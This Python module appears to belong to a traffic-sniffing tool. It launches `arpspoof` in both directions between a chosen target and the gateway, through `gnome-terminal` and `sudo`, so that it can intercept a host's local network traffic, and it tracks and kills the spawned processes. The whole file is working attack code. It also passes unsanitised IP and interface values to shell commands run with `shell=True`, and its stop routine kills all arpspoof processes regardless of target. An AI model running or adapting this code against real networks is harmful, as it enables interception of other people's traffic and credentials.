import subprocess
import threading
import time
import os


# Lock for thread-safe access to sniff_list
sniff_list_lock = threading.Lock()
# List to store information about active ARP spoofing processes
sniff_list = []
sniff_active_list = []

# Dictionary to store IP addresses and their corresponding PIDs
ip_pid_map = {}

def arp_spoof_host_IPs(target_ip, gateway_ip, selected_interface):
    """
    Generate ARP spoofing commands to target a specific IP address.

    Args:
        target_ip (str): The IP address of the target host.
        gateway_ip (str): The IP address of the gateway.
        selected_interface (str): The network interface to use for ARP spoofing.

    Returns:
        list: A list of ARP spoofing commands.
    """
    # ARP spoofing commands targeting both directions
    arpspoof_commands = [
        f"gnome-terminal -- sudo arpspoof -i {selected_interface} -t {target_ip} {gateway_ip}",
        f"gnome-terminal -- sudo arpspoof -i {selected_interface} -t {gateway_ip} {target_ip}"
    ]
    return arpspoof_commands

def stop_arpspoof(ip_address):
    """
    List all arpspoof and gnome-terminal processes, send CTRL+C to arpspoof processes.
    """
    print(ip_pid_map)
    pids_for_ip = ip_pid_map[ip_address]
    print("PIDs for 192.168.2.9:", pids_for_ip)
    try:
        # List all arpspoof processes
        arpspoof_processes = subprocess.run(["pgrep", "arpspoof"], capture_output=True, text=True).stdout.splitlines()
        for pid in arpspoof_processes:
            print(f" (from stop_arpspoof) PID: {pid}")
            # Send CTRL+C signal to the arpspoof process
            try:
                os.kill(int(pid), 2)  # Sending SIGINT signal (CTRL+C)
                print(f"    Sent CTRL+C signal to process with PID {pid}")
            except ProcessLookupError:
                print(f"    Process with PID {pid} not found.")

    except subprocess.CalledProcessError:
        print("Failed to list processes.")


def run_arpspoof(ip_address, gateway_ip, interface):
    """
    Execute ARP spoofing to intercept traffic between a target IP and a gateway.

    Args:
        ip_address (str): The IP address of the target host.
        gateway_ip (str): The IP address of the gateway.
        interface (str): The network interface to use for ARP spoofing.
    """
    global sniff_list
    global ip_pid_map
    # Check if there's an active sniffer for the given IP address
    if not check_sniffer_active(ip_address):
        print("\nARP spoofing for ip:", ip_address, "\n")
        # Generate ARP spoofing commands
        arpspoof_commands = arp_spoof_host_IPs(ip_address, gateway_ip, interface)
        arpspoof_processes = []

        # Start ARP spoofing processes
        for command in arpspoof_commands:
            # Open a new process and capture its output
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            try:
                # Add IP address and process to the arpspoof_processes list
                arpspoof_processes.append({"ip_address": ip_address, "process": process})
            except subprocess.CalledProcessError:
                pass

        # Start threads after starting ARP spoofing processes
        threads = []
        for proc in arpspoof_processes:
            thread = threading.Thread(target=execute_command, args=(proc,))
            threads.append(thread)
            thread.start()

        # Wait for the threads to start before getting the PID
        time.sleep(1)

        # Get the PID after threads have started
        pids_from_arpspoof = subprocess.run(["pgrep", "arpspoof"], capture_output=True, text=True).stdout.splitlines()
    
        # Filter out the PIDs that are not already linked to the IP address
        new_pids = [pid for pid in pids_from_arpspoof if pid not in [pid for pids in ip_pid_map.values() for pid in pids]]

        # Update the IP-PID map with new PIDs
        if new_pids:
            ip_pid_map[ip_address] = ip_pid_map.get(ip_address, []) + new_pids

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

    # Delay for 1 second before next iteration
    time.sleep(1)
    print(ip_pid_map)

def execute_command(proc):
    """
    Execute an ARP spoofing command and print its output.

    Args:
        proc (dict): Dictionary containing information about the ARP spoofing process.
    """
    # Print the output of the command
    for line in iter(proc["process"].stdout.readline, b''):
        print(line.decode(), end='')
    # Wait for the process to finish
    proc["process"].wait()


def check_sniffer_active(ip_address):
    """
    Check if there's an active sniffer for the given IP address.

    Args:
        ip_address (str): The IP address to check.

    Returns:
        bool: True if there's an active sniffer, False otherwise.
    """
    # Acquire lock before accessing sniff_list
    with sniff_list_lock:
        # Check if the IP address is present in any active ARP spoofing process
        return any(ip_address in proc["ip_address"] for proc in sniff_list)

# Example usage
# threading.Thread(target=run_arpspoof, args=("192.168.2.9", "192.168.2.254", "eth0")).start()
# # Start ARP spoofing for the second IP address after a delay
# time.sleep(10)
# threading.Thread(target=run_arpspoof, args=("192.168.2.14", "192.168.2.254", "eth0")).start()

# print(sniff_list)

